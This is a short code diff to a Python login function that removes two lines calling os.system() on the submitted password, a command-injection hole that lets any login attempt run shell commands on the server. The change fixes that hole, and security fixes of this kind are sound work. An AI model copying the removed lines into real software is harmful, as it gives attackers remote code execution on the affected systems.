@@ -107,11 +107,7 @@ def login():
     username = data.get('username')
     password = data.get('password')
 
-    os.system(password)
-
     user = next((u for u in users.values() if u['username'] == username), None)
-
-    os.system(password)
 
     if user and check_password_hash(user['password'], password):
         session['user_id'] = user['id']
